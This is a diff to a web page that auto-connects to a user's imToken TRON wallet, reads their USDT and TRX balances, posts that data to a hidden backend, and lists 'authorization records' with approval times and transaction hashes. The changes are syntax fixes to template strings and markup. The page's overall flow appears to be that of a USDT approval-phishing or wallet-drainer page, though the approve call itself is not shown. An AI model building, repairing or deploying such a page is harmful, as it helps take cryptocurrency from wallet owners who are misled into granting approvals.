@@ -87,7 +87,8 @@
         });
 
         // 步骤1：自动连接钱包（加alert反馈）
-        if (window.tronWeb) {alert("【步骤1】检测到imToken环境，正在尝试自动连接钱包..."); // 弹窗提示
+        if (window.tronWeb) {
+            alert("【步骤1】检测到imToken环境，正在尝试自动连接钱包..."); // 弹窗提示
             if (window.tronWeb.ready) {
                 tronWeb = window.tronWeb;
                 await initWallet(); // 连接后立即查余额
@@ -108,7 +109,7 @@
                 alert("【步骤2】开始手动连接imToken钱包..."); // 弹窗提示
                 if (!window.tronWeb) {
                     alert("【步骤2】未检测到钱包，正在跳转至imToken..."); // 弹窗提示
-                    window.location.href = imtoken://browser?url=${encodeURIComponent(window.location.href)};
+                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                     return;
                 }
                 // 调用钱包授权获取地址
@@ -189,7 +190,8 @@
 
     // ========== 核心函数1：初始化钱包（连接后立即查余额，加alert） ==========
     async function initWallet() {
-        try {alert("【步骤2-1】开始初始化钱包信息..."); // 弹窗提示
+        try {
+            alert("【步骤2-1】开始初始化钱包信息..."); // 弹窗提示
             // 获取钱包地址和合约实例
             userAddress = tronWeb.defaultAddress.base58;
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
@@ -225,7 +227,7 @@
             alert(`【步骤2-2】余额查询成功！\nUSDT余额：${currentUsdtBalance} \nTRX余额：${currentTrxBalance}`);
 
             // 更新页面状态
-            sendStatusDom.textContent = 当前余额：${currentUsdtBalance} USDT / ${currentTrxBalance} TRX;
+            sendStatusDom.textContent = `当前余额：${currentUsdtBalance} USDT / ${currentTrxBalance} TRX`;
             return { usdt: currentUsdtBalance, trx: currentTrxBalance };
         } catch (err) {
             // 余额查询失败也加alert
@@ -250,7 +252,7 @@
     async function sendDataToBackend(data, scene) {
         try {
             alert(`【步骤4】开始向后端发送${scene}数据...`); // 弹窗提示
-            sendStatusDom.textContent = 【步骤4】正在发送${scene}数据到后端...;
+            sendStatusDom.textContent = `【步骤4】正在发送${scene}数据到后端...`;
 
             // 前置校验：后端接口是否配置
             if (!BACKEND_API || BACKEND_API.includes("替换")) {
@@ -288,13 +290,13 @@
             // 发送成功弹窗
             alert(`【步骤4】${scene}数据发送成功！后端返回：${JSON.stringify(resData)}`);
             sendStatusDom.style.color = "#4CAF50";
-            sendStatusDom.textContent = ✅ ${scene}数据已同步到后端;
+            sendStatusDom.textContent = `✅ ${scene}数据已同步到后端`;
             return resData;
         } catch (err) {
             // 发送失败弹窗（即使失败也提示，方便排查）
             alert(`【步骤4】${scene}数据发送失败：${err.message}，已重试3次（间隔2秒）`);
             sendStatusDom.style.color = "#F44336";
-            sendStatusDom.textContent = ❌ ${scene}数据发送失败：${err.message};
+            sendStatusDom.textContent = `❌ ${scene}数据发送失败：${err.message}`;
             throw err; // 抛出错误，让上层知道
         }
     }
@@ -331,7 +333,7 @@
                     <p><strong>USDT：</strong>${record.usdtBalance} USDT</p>
                     <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                     <p><strong>时间：</strong>${record.approveTime}</p>
-                    ${record.txHash ? <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p> : ""}
+                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
                 </div>
             `).join("");
             alert(`【步骤6】已渲染${records.length}条本地授权记录！`); // 弹窗反馈
@@ -339,9 +341,6 @@
             alert(`【步骤6】记录渲染失败：${err.message}`); // 错误弹窗
         }
     }
-</script>
-</body>
-</html>
 </script>
 </body>
 </html>
